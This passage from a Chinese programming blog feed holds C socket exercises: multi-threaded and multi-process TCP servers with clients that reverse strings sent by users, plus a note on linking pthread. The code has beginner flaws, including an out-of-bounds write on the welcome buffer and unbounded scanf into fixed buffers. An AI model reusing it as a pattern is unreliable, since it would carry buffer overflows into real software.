class="line">        &#123;</div><div class="line">            <span class="keyword">char</span> tmp=recv_buf[i];</div><div class="line">            recv_buf[i]=recv_buf[len<span class="number">-1</span>-i];</div><div class="line">            recv_buf[len<span class="number">-1</span>-i]=tmp;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">strcpy</span>(send_buf,recv_buf);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[&gt;] Send reverse string: '%s' to client: &lt;%s&gt; \n"</span>,send_buf,client_name);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((send_num=send(connfd,send_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"send() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(send_buf,<span class="string">"tiuq"</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"[!] Client &lt;%s&gt; have disconnected! \n"</span>,client_name);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(connfd);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">function</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ARG</span> *<span class="title">info</span>;</span></div><div class="line">    info=(struct ARG *)arg;</div><div class="line">    process_cli(info-&gt;connfd,info-&gt;client);</div><div class="line">    <span class="built_in">free</span>(arg);</div><div class="line">    pthread_exit(<span class="literal">NULL</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 1234</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXDATASIZE 100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> sockfd;</div><div class="line">    <span class="keyword">ssize_t</span> send_num;</div><div class="line">    <span class="keyword">ssize_t</span> recv_num;</div><div class="line">    <span class="keyword">char</span> wel_msg[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> cli_name[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> recv_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> send_buf[MAXDATASIZE];</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">he</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></div><div class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Usage:%s &lt;IP Adress&gt;\n"</span>,argv[<span class="number">0</span>]);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>((he=gethostbyname(argv[<span class="number">1</span>]))==<span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"gethostbyname() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>((sockfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"socket() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    bzero(&amp;server,<span class="keyword">sizeof</span>(server));</div><div class="line">    server.sin_family=AF_INET;</div><div class="line">    server.sin_port=htons(PORT);</div><div class="line">    server.sin_addr=*((struct in_addr *)he-&gt;h_addr);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(connect(sockfd,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"connect() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ((recv(sockfd,wel_msg,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"[!] Receive welcome message fail."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    wel_msg[<span class="keyword">sizeof</span>(wel_msg)]=<span class="string">'\0'</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, wel_msg);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Input client name:"</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,cli_name);</div><div class="line">    <span class="keyword">if</span>((send_num=send(sockfd,cli_name,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"send() error."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*] Input string:"</span>);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,send_buf);</div><div class="line">        send_buf[<span class="built_in">strlen</span>(send_buf)]=<span class="string">'\0'</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((send_num=send(sockfd,send_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"send() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((recv_num=recv(sockfd,recv_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"recv() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[&gt;] Received reverse string:%s\n"</span>,recv_buf);</div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(recv_buf,<span class="string">"tiuq"</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(sockfd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-演示"><a href="#0x02-演示" class="headerlink" title="0x02 演示"></a>0x02 演示</h2><p><strong>服务端</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/1743492396.gif" alt="多线程服务端.gif"></p><p><strong>客服端1</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/3431566456.gif" alt="多线程客户端1.gif"></p><p><strong>客户端2</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/301196369.gif" alt="多线程客户端2.gif"></p><h2 id="0x03-心得"><a href="#0x03-心得" class="headerlink" title="0x03 心得"></a>0x03 心得</h2><p>由于pthread 库不是 Linux 系统默认的库，连接时需要使用静态库 libpthread.a，不然在使用pthread_create()创建线程时会报：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">undefined reference to `pthread_create&apos;</div></pre></td></tr></table></figure><p></p><p>类似的错误，由于我是使用的IDE CodeBlocks，所以在Project中找到Build options，在Links setting中添加libpthread.a链接库。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/1850665197.png" alt="添加库.png"></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/3017340323.gif" alt="添加状态.gif"></p><p>如果使用gcc直接使用命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc server.c -o server -lpthread</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> socket programming </tag>
            
            <tag> c </tag>
            
            <tag> socket编程练习 </tag>
            
            <tag> c语言 </tag>
            
            <tag> 多线程服务器 </tag>
            
            <tag> multi-threaded server </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux平台C语言Socket编程练习之多进程服务器]]></title>
      <url>/2016/11/24/Linux%E5%B9%B3%E5%8F%B0C%E8%AF%AD%E8%A8%80Socket%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0%E4%B9%8B%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      <content type="html"><![CDATA[<h2 id="0x00-要求"><a href="#0x00-要求" class="headerlink" title="0x00 要求"></a>0x00 要求</h2><p>采用多进程并发服务器技术，服务器可以同时接受多个客户的请求。具体要求如下:</p><p><strong>服务端</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">接收并显示与之连接的客户端的名称；</div><div class="line"></div><div class="line">接收客户端发来的字符串，显示出来，并对字符串做反转处理，最后将处理后的字符串发回给客户。</div></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">根据客户输入的服务器IP地址，向服务器发起建立连接的请求；</div><div class="line"></div><div class="line">接收客户输入的客户端名称，并把该客户端名称发给服务器；</div><div class="line"></div><div class="line">接收客户输入的字符串，将字符串发送给服务器；</div><div class="line"></div><div class="line">接收服务器发回的反转处理后的字符串并显示。继续接受客户输入的字符串，直到用户输入quit时退出。</div></pre></td></tr></table></figure><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><a id="more"></a><p><strong>服务端</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 1234</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BACKLOG 5</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXDATASIZE 100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">pro_cli</span><span class="params">(<span class="keyword">int</span> connfd,struct sockaddr_in client)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> listenfd;</div><div class="line">    <span class="keyword">int</span> connfd;</div><div class="line">    <span class="keyword">socklen_t</span> client_len;</div><div class="line">    <span class="keyword">pid_t</span> pid;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client</span>;</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>((listenfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"socket() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> opt=SO_REUSEADDR;</div><div class="line">    setsockopt(listenfd,SOL_SOCKET,SO_REUSEADDR,&amp;opt,<span class="keyword">sizeof</span>(opt));</div><div class="line">    bzero(&amp;server,<span class="keyword">sizeof</span>(server));</div><div class="line">    server.sin_family=AF_INET;</div><div class="line">    server.sin_port=htons(PORT);</div><div class="line">    server.sin_addr.s_addr=htonl(INADDR_ANY);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(bind(listenfd,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"bind() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(listen(listenfd,BACKLOG)==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"listen() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    client_len=<span class="keyword">sizeof</span>(client);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(((connfd=accept(listenfd,(struct sockaddr *)&amp;client,&amp;client_len))==<span class="number">-1</span>))</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"accept() failed."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((pid=fork())&gt;<span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            close(connfd);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            close(listenfd);</div><div class="line">            pro_cli(connfd,client);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"fork() failed."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">        close(listenfd);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">pro_cli</span><span class="params">(<span class="keyword">int</span> connfd,struct sockaddr_in client)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">ssize_t</span> send_num;</div><div class="line">    <span class="keyword">ssize_t</span> recv_num;</div><div class="line">    <span class="keyword">char</span> send_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> recv_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> client_name[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> wel_msg[]=<span class="string">"[!] Welcome,you can input 'quit' to exit :)  "</span>;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[!] You got a connection from client IP: &lt;%s&gt; PORT: &lt;%d&gt; \n"</span>,inet_ntoa(client.sin_addr),ntohs(client.sin_port));</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((send(connfd,wel_msg,<span class="built_in">strlen</span>(wel_msg),<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"send welcome messages fail."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>((recv_num=recv(connfd,client_name,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"recv() failed."</span>);</div><div class="line">        close(connfd);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(recv_num==<span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Client disconnected.\n"</span>);</div><div class="line">        close(connfd);</div><div class="line">    &#125;</div><div class="line">    client_name[recv_num<span class="number">-1</span>]=<span class="string">'\0'</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Client name: &lt;%s&gt; \n"</span>,client_name);</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>((recv_num=recv(connfd,recv_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"recv() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line">        recv_buf[recv_num<span class="number">-1</span>]=<span class="string">'\0'</span>;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*] Received string: '%s' from client: &lt;%s&gt; \n "</span>,recv_buf,client_name);</div><div class="line"></div><div class="line">        <span class="keyword">size_t</span> len=<span class="built_in">strlen</span>(recv_buf);</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;(len/<span class="number">2</span>); ++i)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">char</span> tmp=recv_buf[i];</div><div class="line">            recv_buf[i]=recv_buf[len<span class="number">-1</span>-i];</div><div class="line">            recv_buf[len<span class="number">-1</span>-i]=tmp;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">strcpy</span>(send_buf,recv_buf);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[&gt;] Send reverse string: '%s' to client: &lt;%s&gt; \n"</span>,send_buf,client_name);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((send_num=send(connfd,send_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"send() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(send_buf,<span class="string">"tiuq"</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"[!] Client &lt;%s&gt; have disconnected! \n"</span>,client_name);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(connfd);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 1234</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXDATASIZE 100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> sockfd;</div><div class="line">    <span class="keyword">ssize_t</span> send_num;</div><div class="line">    <span class="keyword">ssize_t</span> recv_num;</div><div class="line">    <span class="keyword">char</span> wel_msg[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> cli_name[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> recv_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> send_buf[MAXDATASIZE];</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">he</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></div><div class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Usage:%s &lt;IP Adress&gt;\n"</span>,argv[<span class="number">0</span>]);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>((he=gethostbyname(argv[<span class="number">1</span>]))==<span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"gethostbyname() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>((sockfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"socket() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    bzero(&amp;server,<span class="keyword">sizeof</span>(server));</div><div class="line">    server.sin_family=AF_INET;</div><div class="line">    